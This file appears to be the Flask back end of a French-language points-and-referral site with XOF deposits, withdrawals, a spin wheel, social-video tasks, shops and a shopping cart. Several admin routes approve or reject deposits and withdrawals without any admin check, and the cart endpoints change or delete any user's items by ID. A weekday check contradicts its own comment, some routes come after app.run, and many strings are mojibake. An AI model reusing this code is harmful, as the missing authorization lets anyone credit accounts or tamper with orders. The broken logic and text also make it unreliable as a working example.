def retrait_points_page():
    user = get_logged_in_user()

    # Calculer le montant des points disponibles
    total_points = (
        (user.points or 0) +
        (user.points_video or 0) +
        (user.points_youtube or 0) +
        (user.points_tiktok or 0) +
        (user.points_instagram or 0) +
        (user.points_ads or 0) +
        (user.points_spin or 0) +
        (user.points_games or 0)
    )
    tranches = total_points // 100
    montant_xof = tranches * 200
    points_utilisables = tranches * 100
    retrait_min = 4000

    if request.method == "POST":
        if montant_xof < retrait_min:
            flash(f"Le montant minimum pour un retrait est de {retrait_min} XOF.", "danger")
            return redirect(url_for("retrait_points_page"))

        payment_method = request.form.get("payment_method")
        if not payment_method:
            flash("Veuillez s├®lectionner un mode de paiement.", "danger")
            return redirect(url_for("retrait_points_page"))

        # Cr├®er la demande de retrait (├á traiter par admin si n├®cessaire)
        retrait = RetraitPoints(
            user_id=user.id,
            points_utilises=points_utilisables,
            montant_xof=montant_xof,
            statut='en_attente'
        )
        db.session.add(retrait)

        # D├®duire les points utilis├®s
        user.points = total_points - points_utilisables
        db.session.commit()

        flash(f"Votre demande de retrait de {montant_xof} XOF a ├®t├® enregistr├®e.", "success")
        return redirect(url_for("retrait_points_page"))

    return render_template(
        "retrait_points.html",
        user=user,
        montant_xof=montant_xof,
        points_utilisables=points_utilisables,
        retrait_min=retrait_min
    )

@app.route("/wheel")
def wheel():
    user = get_logged_in_user()

    # V├®rifier si lÔÇÖutilisateur a d├®j├á tourn├® la roue
    if user.has_spun_wheel:
        already_spun = True
    else:
        already_spun = False

    return render_template("wheel.html", user=user, already_spun=already_spun)

import random

@app.route("/wheel/spin", methods=["POST"])
def spin_wheel():
    user = get_logged_in_user()

    # Si d├®j├á tourn├® ÔåÆ refus
    if user.has_spun_wheel:
        return jsonify({"status": "error", "message": "Vous avez d├®j├á utilis├® votre chance !"})

    import random

    values = [0, 50, 80, 130, 150, 180, 200, 220, 250, 300, 340, 460]

    # G├®n├®ration pond├®r├®e (rare, commun)
    weighted = []
    for v in values:
        if v in [250, 300, 340, 460]:
            weighted += [v] * 1
        elif v >= 200:
            weighted += [v] * 3
        else:
            weighted += [v] * 10

    reward = random.choice(weighted)

    # Enregistrer que le joueur a d├®j├á jou├®
    user.has_spun_wheel = True
    user.solde_revenu += reward
    db.session.commit()

    return jsonify({"status": "success", "reward": reward})

@app.route("/team")
def team_page():
    user = get_logged_in_user()

    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    # On ne r├®cup├¿re que les infos n├®cessaires pour l'affichage (Username, Phone, Pays, Premier_depot)
    # Niveau 1
    level1 = User.query.with_entities(
        User.username, User.phone, User.country, User.premier_depot, User.date_creation
    ).filter_by(parrain=user.username).all()
    
    level1_usernames = [u.username for u in level1]

    # Niveau 2
    level2 = []
    level2_usernames = []
    if level1_usernames:
        level2 = User.query.with_entities(
            User.username, User.phone, User.country, User.premier_depot, User.date_creation
        ).filter(User.parrain.in_(level1_usernames)).all()
        level2_usernames = [u.username for u in level2]

    # Niveau 3
    level3 = []
    if level2_usernames:
        level3 = User.query.with_entities(
            User.username, User.phone, User.country, User.premier_depot, User.date_creation
        ).filter(User.parrain.in_(level2_usernames)).all()

    stats = {
        "level1": len(level1),
        "level2": len(level2),
        "level3": len(level3),
        "commissions_total": float(user.solde_revenu or 0)
    }

    return render_template(
        "team.html",
        referral_link=referral_link,
        stats=stats,
        level1_users=level1,
        level2_users=level2,
        level3_users=level3
    )

# ===== Page de connexion admin =====
@app.route("/admin/finance", methods=["GET", "POST"])
def admin_finance():
    submitted = False  # Sert ├á afficher le loader
    if request.method == "POST":
        submitted = True
        username = request.form.get("username")
        password = request.form.get("password")

        # V├®rifie l'utilisateur admin
        user = User.query.filter_by(username=username, is_admin=True).first()
        if user and check_password_hash(user.password, password):
            session["admin_id"] = user.id  # Stocke l'id de l'admin
            # Redirection vers admin_deposits apr├¿s connexion
            return redirect(url_for("admin_deposits"))
        else:
            flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
            # Reste sur la page avec le message flash
            return render_template("admin_finance.html", submitted=False)

    # GET ÔåÆ formulaire normal
    return render_template("admin_finance.html", submitted=submitted)

# ===== D├®tection de l'admin connect├® =====
def get_logged_in_admin():
    admin_id = session.get("admin_id")
    if admin_id:
        return User.query.filter_by(id=admin_id, is_admin=True).first()
    return None

from flask import request, render_template, flash, redirect, url_for

PER_PAGE = 50


from sqlalchemy import func

@app.route("/admin/deposits")
def admin_deposits():
    user = get_logged_in_admin()
    if not user:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("admin_finance"))

    page = request.args.get("page", 1, type=int)
    PER_PAGE = 50

    # 1. UTILISATEURS PAGIN├ëS
    users_paginated = User.query.order_by(User.date_creation.desc()).paginate(page=page, per_page=PER_PAGE, error_out=False)
    
    # S├®paration Actifs/Inactifs de la page courante
    actifs = [u for u in users_paginated.items if u.premier_depot]
    inactifs = [u for u in users_paginated.items if not u.premier_depot]

    # Stats Globales (Rapide)
    total_actifs = User.query.filter_by(premier_depot=True).count()
    total_inactifs = User.query.filter_by(premier_depot=False).count()

    # 2. D├ëPOTS EN ATTENTE (Filtrage sur les nouveaux utilisateurs)
    subquery = (
        db.session.query(func.max(Depot.id).label("last_id"))
        .join(User, Depot.user_name == User.username)
        .filter(Depot.statut == "en_attente", User.premier_depot == False)
        .group_by(Depot.phone).subquery()
    )

    depots = (
        Depot.query.filter(Depot.id.in_(db.session.query(subquery.c.last_id)))
        .join(User, Depot.user_name == User.username)
        .order_by(Depot.date.desc()).all()
    )

    # 3. RETRAITS (Version corrig├®e avec jointure)
    retraits_paginated = (
        db.session.query(Retrait, User.username)
        .join(User, Retrait.user_id == User.id)
        .order_by(Retrait.date.desc())
        .paginate(page=page, per_page=PER_PAGE, error_out=False)
    )

    retraits_list = []
    for r, uname in retraits_paginated.items:
        r.username_display = uname
        retraits_list.append(r)

    return render_template(
        "admin_deposits.html",
        user=user,
        users=users_paginated.items,
        depots=depots,
        retraits=retraits_list,
        actifs=actifs,
        inactifs=inactifs,
        total_actifs=total_actifs,
        total_inactifs=total_inactifs,
        users_paginated=users_paginated,
        retraits_paginated=retraits_paginated
    )


@app.route("/admin/deposits/valider/<int:depot_id>")
def valider_depot(depot_id):

    depot = Depot.query.get_or_404(depot_id)

    # User concern├® par le d├®p├┤t via username
    user = User.query.filter_by(username=depot.user_name).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_deposits"))

    # Si d├®j├á valid├®
    if depot.statut == "valide":
        flash("Ce d├®p├┤t est d├®j├á valid├®.", "warning")
        return redirect(url_for("admin_deposits"))

    # V├®rifier si l'utilisateur n'a jamais eu de d├®p├┤t valid├® avant
    premier_depot_valide = not Depot.query.filter_by(
        user_name=user.username,
        statut="valide"
    ).first()

    # Valider le d├®p├┤t
    depot.statut = "valide"

    # Cr├®diter le compte
    user.solde_depot += depot.montant
    user.solde_total += depot.montant

    # Premier d├®p├┤t
    if premier_depot_valide:
        user.premier_depot = True

        # Commission parrain
        if user.parrain:
            donner_commission(user.parrain, depot.montant)

    db.session.commit()

    flash("D├®p├┤t valid├® et cr├®dit├® avec succ├¿s !", "success")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/deposits/rejeter/<int:depot_id>")
def rejeter_depot(depot_id):
    user_admin = get_logged_in_user()

    depot = Depot.query.get_or_404(depot_id)

    if depot.statut in ["valide", "rejete"]:
        flash("Ce d├®p├┤t a d├®j├á ├®t├® trait├®.", "warning")
        return redirect(url_for("admin_deposits"))

    depot.statut = "rejete"
    db.session.commit()

    flash("D├®p├┤t rejet├® avec succ├¿s.", "danger")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/retraits")
def admin_retraits():

    user = get_logged_in_admin()
    if not user:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("admin_finance"))

    # R├®cup├®ration avec join
    retraits_query = (
        db.session.query(Retrait, User.username)
        .join(User, User.phone == Retrait.phone)
        .filter(Retrait.statut == "successful")
        .order_by(Retrait.date.desc())
    )

    # Liste finale de retraits avec username_display
    retraits = []
    for retrait, username in retraits_query.all():
        retrait.username_display = username  # pour le template
        retraits.append(retrait)

    return render_template(
        "admin_retraits.html",
        retraits=retraits
    )

@app.route("/admin/retraits/valider/<int:retrait_id>")
def valider_retrait(retrait_id):
    user_admin = get_logged_in_user()

    retrait = Retrait.query.get_or_404(retrait_id)
    user = User.query.filter_by(phone=retrait.phone).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_retraits"))

    if retrait.statut == "valid├®":
        flash("Ce retrait a d├®j├á ├®t├® valid├®.", "info")
        return redirect(url_for("admin_retraits"))

    retrait.statut = "valid├®"

    # Total retrait
    user.total_retrait += retrait.montant + (retrait.frais or 0)

    db.session.commit()

    flash("Retrait valid├® avec succ├¿s !", "success")
    return redirect(url_for("admin_retraits"))

@app.route("/admin/retraits/refuser/<int:retrait_id>")
def refuser_retrait(retrait_id):
    user_admin = get_logged_in_user()

    retrait = Retrait.query.get_or_404(retrait_id)
    user = User.query.filter_by(phone=retrait.phone).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_retraits"))

    if retrait.statut == "refus├®":
        flash("Ce retrait a d├®j├á ├®t├® refus├®.", "info")
        return redirect(url_for("admin_retraits"))

    # Recr├®diter
    user.solde_parrainage += (retrait.montant + (retrait.frais or 0))
    retrait.statut = "refus├®"

    db.session.commit()

    flash("Retrait refus├® et montant recr├®dit├® ├á lÔÇÖutilisateur.", "warning")
    return redirect(url_for("admin_retraits"))

@app.route("/taches/questions-lundi", methods=["GET", "POST"])
def questions_lundi():
    user = get_logged_in_user()  # r├®cup├¿re l'utilisateur connect├®

    # V├®rifier si aujourd'hui est lundi (0 = lundi)
    if date.today().weekday() != 0:
        return render_template("pas_lundi.html", user=user)

    # V├®rifier si l'utilisateur a d├®j├á particip├® aujourd'hui
    deja_fait = QuestionReponse.query.filter_by(
        user_id=user.id,
        date=date.today()
    ).first()

    if deja_fait:
        return render_template("deja_fait.html", user=user)

    # S├®lectionner 5 questions al├®atoires
    questions = Question.query.order_by(db.func.random()).limit(5).all()

    if request.method == "POST":
        score = 0
        for q in questions:
            user_answer = request.form.get(f"question_{q.id}", "").strip().lower()
            if user_answer == q.correct_answer.lower():
                score += 5  # Chaque question correcte = 5 points

        # Ajouter les points ├á l'utilisateur
        user.points += score
        db.session.commit()

        # Enregistrer la tentative dans QuestionReponse
        reponse = QuestionReponse(user_id=user.id, points=score, date=date.today())
        db.session.add(reponse)
        db.session.commit()

        # Pr├®parer le message
        if score == 25:
            message = "Bravo ! Vous avez r├®pondu correctement ├á toutes les questions et gagn├® 25 points !"
        else:
            message = f"Vous avez obtenu {score} points sur 25."

        return render_template("resultat_lundi.html", score=score, message=message, user=user)

    return render_template("questions_lundi.html", questions=questions, user=user)


@app.route("/admin/users/activer/<username>")
def admin_activer_user(username):
    admin = get_logged_in_admin()
    if not admin:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("admin_finance"))

    user = User.query.filter_by(username=username).first()
    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_deposits"))

    if user.premier_depot:
        flash("Cet utilisateur est d├®j├á actif.", "warning")
        return redirect(url_for("admin_deposits"))

    # ­ƒöÑ Montant dÔÇÖactivation (tu peux changer)
    montant_activation = 0

    # Activer user
    user.premier_depot = True

    # Si tu veux cr├®diter aussi automatiquement
    if montant_activation > 0:
        user.solde_depot += montant_activation
        user.solde_total += montant_activation

        # Cr├®er un d├®p├┤t valid├® (recommand├® pour historique)
        depot = Depot(
            user_name=user.username,
            phone=user.phone,
            email=user.email,
            montant=montant_activation,
            statut="valide"
        )
        db.session.add(depot)

        # Commission parrain
        if user.parrain:
            donner_commission(user.parrain, montant_activation)

    db.session.commit()
    flash("Utilisateur activ├® avec succ├¿s !", "success")
    return redirect(url_for("admin_deposits"))


@app.route("/tiktok/complete")
def tiktok_complete():
    user = get_logged_in_user()

    today = datetime.today().weekday()  # mardi = 1
    current_date = datetime.today().strftime("%Y-%m-%d")

    if today != 1:
        return {"status": "error", "message": "La vid├®o nÔÇÖest disponible que le mardi."}

    if user.last_tiktok_date != current_date:
        user.points_tiktok += 20
        user.points_video += 20
        user.points += 20
        user.last_tiktok_date = current_date
        db.session.commit()
        return {"status": "ok", "message": "Points ajout├®s"}

    return {"status": "done", "message": "Vous avez d├®j├á obtenu vos points aujourdÔÇÖhui."}


@app.route("/tiktok")
def tiktok_page():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # mardi = 1
    current_date = datetime.today().strftime("%Y-%m-%d")

    return render_template(
        "tiktok.html",
        user=user,
        today=today,
        current_date=current_date
    )


@app.route("/youtube")
def youtube_page():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # mercredi = 2
    current_date = datetime.today().strftime("%Y-%m-%d")

    return render_template(
        "youtube.html",
        user=user,
        today=today,
        current_date=current_date
    )

@app.route("/youtube/complete")
def youtube_complete():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # mercredi = 2
    current_date = datetime.today().strftime("%Y-%m-%d")

    if today != 2:
        return jsonify({"status": "error", "message": "La vid├®o nÔÇÖest disponible que le mercredi."})

    if user.last_youtube_date != current_date:
        user.points_youtube += 20
        user.points += 20
        user.last_youtube_date = current_date
        db.session.commit()
        return jsonify({"status": "ok", "message": "Points ajout├®s"})

    return jsonify({"status": "done", "message": "Vous avez d├®j├á obtenu vos points aujourdÔÇÖhui."})

@app.route("/instagram")
def instagram_page():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # jeudi = 3
    current_date = datetime.today().strftime("%Y-%m-%d")

    return render_template(
        "instagram.html",
        user=user,
        today=today,
        current_date=current_date
    )

@app.route("/instagram/complete")
def instagram_complete():
    user = get_logged_in_user()
    today = datetime.today().weekday()  # jeudi = 3
    current_date = datetime.today().strftime("%Y-%m-%d")

    if today != 4:
        return jsonify({"status": "error", "message": "La vid├®o nÔÇÖest disponible que le jeudi."})

    if user.last_instagram_date != current_date:
        user.points_instagram += 20
        user.points += 20
        user.last_instagram_date = current_date
        db.session.commit()
        return jsonify({"status": "ok", "message": "Points ajout├®s"})

    return jsonify({"status": "done", "message": "Vous avez d├®j├á obtenu vos points aujourdÔÇÖhui."})

@app.route("/health")
def health():
    return {"status": "ok"}, 200


# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
# ­ƒÅ¬ ROUTES POUR LES BOUTIQUES ET VENDEURS
# ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ

# Liste des cat├®gories pr├®d├®finies
CATEGORIES_PREDEFINIES = [
    {"nom": "Mode & V├¬tements", "icone": "­ƒæò", "description": "V├¬tements, chaussures, accessoires de mode"},
    {"nom": "├ëlectronique", "icone": "­ƒô▒", "description": "T├®l├®phones, ordinateurs, accessoires ├®lectroniques"},
    {"nom": "Maison & Jardin", "icone": "­ƒÅá", "description": "D├®coration, meubles, articles de maison"},
    {"nom": "Beaut├® & Sant├®", "icone": "­ƒÆä", "description": "Cosm├®tiques, produits de beaut├®, sant├®"},
    {"nom": "Sports & Loisirs", "icone": "ÔÜ¢", "description": "├ëquipements sportifs, loisirs, plein air"},
    {"nom": "Livres & M├®dias", "icone": "­ƒôÜ", "description": "Livres, musique, films, jeux vid├®o"},
    {"nom": "Alimentation", "icone": "­ƒìö", "description": "Produits alimentaires, boissons, ├®picerie"},
    {"nom": "B├®b├® & Enfant", "icone": "­ƒæÂ", "description": "Articles pour b├®b├®s et enfants"},
    {"nom": "Animaux", "icone": "­ƒÉò", "description": "Accessoires et produits pour animaux"},
    {"nom": "Auto & Moto", "icone": "­ƒÜù", "description": "Pi├¿ces d├®tach├®es, accessoires automobiles"},
    {"nom": "Art & Artisanat", "icone": "­ƒÄ¿", "description": "┼Æuvres d'art, faits main, artisanat"},
    {"nom": "Autre", "icone": "­ƒôª", "description": "Autres cat├®gories non list├®es"},
]


def init_categories():
    """Initialise les cat├®gories par d├®faut si elles n'existent pas"""
    for cat in CATEGORIES_PREDEFINIES:
        if not Categorie.query.filter_by(nom=cat["nom"]).first():
            nouvelle_cat = Categorie(
                nom=cat["nom"],
                description=cat["description"],
                icone=cat["icone"]
            )
            db.session.add(nouvelle_cat)
    try:
        db.session.commit()
    except:
        db.session.rollback()


@app.route("/api/categories")
def api_categories():
    """Retourne la liste des cat├®gories en JSON"""
    categories = Categorie.query.order_by(Categorie.nom).all()
    return jsonify([{
        "id": c.id,
        "nom": c.nom,
        "description": c.description,
        "icone": c.icone
    } for c in categories])


@app.route("/boutique/creer", methods=["GET", "POST"])
@login_required
def creer_boutique():
    """Page pour cr├®er une nouvelle boutique"""
    user = get_logged_in_user()

    # V├®rifier si l'utilisateur a d├®j├á une boutique
    existing_boutique = Boutique.query.filter_by(user_id=user.id, est_actif=True).first()
    if existing_boutique:
        flash("Vous avez d├®j├á une boutique active.", "warning")
        return redirect(url_for("ma_boutique", boutique_id=existing_boutique.id))

    if request.method == "POST":
        nom = request.form.get("nom", "").strip()
        description = request.form.get("description", "").strip()
        email = request.form.get("email", "").strip()
        whatsapp = request.form.get("whatsapp", "").strip()
        adresse = request.form.get("adresse", "").strip()
        ville = request.form.get("ville", "").strip()
        pays = request.form.get("pays", "").strip()
        latitude = request.form.get("latitude", "").strip()
        longitude = request.form.get("longitude", "").strip()

        if not nom:
            flash("Le nom de la boutique est obligatoire.", "danger")
            return render_template("boutique_creer.html", user=user)

        nouvelle_boutique = Boutique(
            user_id=user.id,
            nom=nom,
            description=description,
            email=email,
            whatsapp=whatsapp,
            adresse=adresse,
            ville=ville,
            pays=pays,
            latitude=latitude,
            longitude=longitude
        )

        db.session.add(nouvelle_boutique)
        db.session.commit()

        flash("Boutique cr├®├®e avec succ├¿s ! ­ƒÄë", "success")
        return redirect(url_for("ma_boutique", boutique_id=nouvelle_boutique.id))

    return render_template("boutique_creer.html", user=user)


@app.route("/boutique/<int:boutique_id>")
def ma_boutique(boutique_id):
    """Page principale d'une boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    produits = Produit.query.filter_by(boutique_id=boutique_id, est_actif=True).order_by(Produit.date_creation.desc()).all()

    # Calculer la note moyenne
    avis = AvisBoutique.query.filter_by(boutique_id=boutique_id).all()
    note_moyenne = sum(a.note for a in avis) / len(avis) if avis else 0

    return render_template("boutique_view.html",
        boutique=boutique,
        produits=produits,
        note_moyenne=note_moyenne,
        nb_avis=len(avis),
        user=user
    )


@app.route("/boutique/<int:boutique_id>/configurer", methods=["GET", "POST"])
@login_required
def configurer_boutique(boutique_id):
    """Page pour configurer sa boutique"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # V├®rifier que l'utilisateur est le propri├®taire
    if boutique.user_id != user.id:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("dashboard_page"))

    if request.method == "POST":
        boutique.nom = request.form.get("nom", "").strip()
        boutique.description = request.form.get("description", "").strip()
        boutique.email = request.form.get("email", "").strip()
        boutique.whatsapp = request.form.get("whatsapp", "").strip()
        boutique.adresse = request.form.get("adresse", "").strip()
        boutique.ville = request.form.get("ville", "").strip()
        boutique.pays = request.form.get("pays", "").strip()
        boutique.latitude = request.form.get("latitude", "").strip()
        boutique.longitude = request.form.get("longitude", "").strip()

        # Gestion du logo
        if "logo" in request.files:
            file = request.files["logo"]
            if file and allowed_file(file.filename):
                filename = secure_filename(f"logo_{boutique.id}_{file.filename}")
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                boutique.logo = f"/{filepath}"

        # Gestion de la banni├¿re
        if "banniere" in request.files:
            file = request.files["banniere"]
            if file and allowed_file(file.filename):
                filename = secure_filename(f"banniere_{boutique.id}_{file.filename}")
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                boutique.banniere = f"/{filepath}"

        db.session.commit()
        flash("Boutique mise ├á jour avec succ├¿s !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("boutique_config.html", boutique=boutique, user=user)


@app.route("/boutique/<int:boutique_id>/produit/ajouter", methods=["GET", "POST"])
@login_required
def ajouter_produit(boutique_id):
    """Page pour ajouter un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # V├®rifier que l'utilisateur est le propri├®taire
    if boutique.user_id != user.id:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("dashboard_page"))

    categories = Categorie.query.order_by(Categorie.nom).all()

    if request.method == "POST":
        nom = request.form.get("nom", "").strip()
        description = request.form.get("description", "").strip()
        prix = request.form.get("prix", type=float)
        prix_promo = request.form.get("prix_promo", type=float)
        quantite = request.form.get("quantite", type=int, default=1)
        categorie_id = request.form.get("categorie_id", type=int)
        couleurs = request.form.get("couleurs", "").strip()
        tailles = request.form.get("tailles", "").strip()

        if not nom or not prix:
            flash("Le nom et le prix sont obligatoires.", "danger")
            return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)

        nouveau_produit = Produit(
            boutique_id=boutique.id,
            nom=nom,
            description=description,
            prix=prix,
            prix_promo=prix_promo if prix_promo and prix_promo < prix else None,
            quantite=quantite,
            categorie_id=categorie_id if categorie_id else None,
            couleurs_disponibles=couleurs,
            tailles_disponibles=tailles,
            est_en_promo=prix_promo is not None and prix_promo < prix
        )

        db.session.add(nouveau_produit)
        db.session.commit()

        flash("Produit ajout├® avec succ├¿s !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("produit_ajouter.html", boutique=boutique, categories=categories, user=user)


@app.route("/boutique/<int:boutique_id>/produit/<int:produit_id>/modifier", methods=["GET", "POST"])
@login_required
def modifier_produit(boutique_id, produit_id):
    """Page pour modifier un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # V├®rifier que l'utilisateur est le propri├®taire
    if boutique.user_id != user.id:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("dashboard_page"))

    categories = Categorie.query.order_by(Categorie.nom).all()

    if request.method == "POST":
        produit.nom = request.form.get("nom", "").strip()
        produit.description = request.form.get("description", "").strip()
        produit.prix = request.form.get("prix", type=float)
        produit.prix_promo = request.form.get("prix_promo", type=float)
        produit.quantite = request.form.get("quantite", type=int, default=1)
        produit.categorie_id = request.form.get("categorie_id", type=int)
        produit.couleurs_disponibles = request.form.get("couleurs", "").strip()
        produit.tailles_disponibles = request.form.get("tailles", "").strip()
        produit.est_en_promo = produit.prix_promo is not None and produit.prix_promo < produit.prix

        db.session.commit()
        flash("Produit mis ├á jour avec succ├¿s !", "success")
        return redirect(url_for("ma_boutique", boutique_id=boutique.id))

    return render_template("produit_modifier.html", boutique=boutique, produit=produit, categories=categories, user=user)


@app.route("/boutique/<int:boutique_id>/produit/<int:produit_id>/supprimer")
@login_required
def supprimer_produit(boutique_id, produit_id):
    """Supprimer un produit"""
    boutique = Boutique.query.get_or_404(boutique_id)
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # V├®rifier que l'utilisateur est le propri├®taire
    if boutique.user_id != user.id:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("dashboard_page"))

    db.session.delete(produit)
    db.session.commit()

    flash("Produit supprim├® avec succ├¿s.", "success")
    return redirect(url_for("ma_boutique", boutique_id=boutique.id))


@app.route("/produits")
def liste_produits():
    """Page publique pour voir tous les produits"""
    user = get_logged_in_user()
    categorie_id = request.args.get("categorie", type=int)
    recherche = request.args.get("q", "").strip()

    query = Produit.query.filter_by(est_actif=True)

    if categorie_id:
        query = query.filter_by(categorie_id=categorie_id)

    if recherche:
        query = query.filter(
            db.or_(
                Produit.nom.ilike(f"%{recherche}%"),
                Produit.description.ilike(f"%{recherche}%")
            )
        )

    produits = query.order_by(Produit.date_creation.desc()).limit(50).all()
    categories = Categorie.query.order_by(Categorie.nom).all()

    return render_template("produits_liste.html",
        produits=produits,
        categories=categories,
        categorie_actuelle=categorie_id,
        recherche=recherche,
        user=user
    )


@app.route("/produit/<int:produit_id>")
def voir_produit(produit_id):
    """Page d├®tail d'un produit"""
    produit = Produit.query.get_or_404(produit_id)
    user = get_logged_in_user()

    # Incr├®menter le compteur de vues
    produit.vues = (produit.vues or 0) + 1
    db.session.commit()

    return render_template("produit_detail.html", produit=produit, user=user)


@app.route("/boutique/<int:boutique_id>/supprimer")
@login_required
def supprimer_boutique(boutique_id):
    """Supprimer une boutique (d├®sactivation logique)"""
    boutique = Boutique.query.get_or_404(boutique_id)
    user = get_logged_in_user()

    # V├®rifier que l'utilisateur est le propri├®taire
    if boutique.user_id != user.id:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("dashboard_page"))

    # D├®sactiver la boutique (soft delete)
    boutique.est_actif = False
    db.session.commit()

    flash("Boutique supprim├®e avec succ├¿s.", "success")
    return redirect(url_for("dashboard_page"))


@app.route("/boutiques")
def liste_boutiques():
    """Page publique pour voir toutes les boutiques"""
    user = get_logged_in_user()
    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(50).all()

    return render_template("boutiques_liste.html", boutiques=boutiques, user=user)


# Initialiser les cat├®gories au d├®marrage
with app.app_context():
    try:
        init_categories()
    except:
        pass  # Ignore les erreurs si la table n'existe pas encore


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Render fournit le PORT
    app.run(host="0.0.0.0", port=port, debug=False)


# ==============================
# 🛒 SYSTEME DE PANIER - ROUTES API
# ==============================

def get_or_create_panier():
    """Récupère ou crée un panier pour l'utilisateur connecté ou la session"""
    user = get_logged_in_user()
    session_id = session.get("session_id")
    
    if user:
        panier = Panier.query.filter_by(user_id=user.id).first()
        if not panier:
            panier = Panier(user_id=user.id)
            db.session.add(panier)
            db.session.commit()
        return panier, user
    else:
        if not session_id:
            session["session_id"] = session_id = str(uuid.uuid4())
        panier = Panier.query.filter_by(session_id=session_id).first()
        if not panier:
            panier = Panier(session_id=session_id)
            db.session.add(panier)
            db.session.commit()
        return panier, None


@app.route("/api/panier")
def api_panier():
    """API: Récupérer le contenu du panier"""
    panier, user = get_or_create_panier()
    
    articles = []
    for article in panier.articles:
        produit = article.produit
        prix = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
        articles.append({
            "id": article.id,
            "produit_id": produit.id,
            "nom": produit.nom,
            "prix": prix,
            "quantite": article.quantite,
            "image": produit.image_principale,
            "sous_total": prix * article.quantite
        })
    
    return jsonify({
        "success": True,
        "articles": articles,
        "total": panier.get_total(),
        "item_count": panier.get_item_count()
    })


@app.route("/api/panier/count")
def api_panier_count():
    """API: Nombre d'articles dans le panier"""
    panier, user = get_or_create_panier()
    return jsonify({"count": panier.get_item_count()})


@app.route("/api/panier/ajouter", methods=["POST"])
def api_ajouter_panier():
    """API: Ajouter un article au panier"""
    data = request.get_json()
    produit_id = data.get("produit_id")
    quantite = data.get("quantite", 1)
    
    if not produit_id:
        return jsonify({"success": False, "message": "produit_id requis"}), 400
    
    produit = Produit.query.get(produit_id)
    if not produit:
        return jsonify({"success": False, "message": "Produit introuvable"}), 404
    
    if produit.quantite < quantite:
        return jsonify({"success": False, "message": "Stock insuffisant"}), 400
    
    panier, user = get_or_create_panier()
    
    # Vérifier si l'article existe déjà
    article = ArticlePanier.query.filter_by(panier_id=panier.id, produit_id=produit_id).first()
    if article:
        article.quantite += quantite
    else:
        article = ArticlePanier(panier_id=panier.id, produit_id=produit_id, quantite=quantite)
        db.session.add(article)
    
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Article ajouté au panier",
        "item_count": panier.get_item_count()
    })


@app.route("/api/panier/<int:article_id>", methods=["PUT"])
def api_modifier_article(article_id):
    """API: Modifier la quantité d'un article"""
    data = request.get_json()
    nouvelle_quantite = data.get("quantite", 1)
    
    article = ArticlePanier.query.get(article_id)
    if not article:
        return jsonify({"success": False, "message": "Article introuvable"}), 404
    
    if nouvelle_quantite < 1:
        # Supprimer l'article
        db.session.delete(article)
        db.session.commit()
        return jsonify({"success": True, "message": "Article supprimé"})
    
    if article.produit.quantite < nouvelle_quantite:
        return jsonify({"success": False, "message": "Stock insuffisant"}), 400
    
    article.quantite = nouvelle_quantite
    db.session.commit()
    
    return jsonify({"success": True, "message": "Quantité mise à jour"})


@app.route("/api/panier/<int:article_id>", methods=["DELETE"])
def api_supprimer_article(article_id):
    """API: Supprimer un article du panier"""
    article = ArticlePanier.query.get(article_id)
    if not article:
        return jsonify({"success": False, "message": "Article introuvable"}), 404
    
    db.session.delete(article)
    db.session.commit()
    
    return jsonify({"success": True, "message": "Article supprimé"})


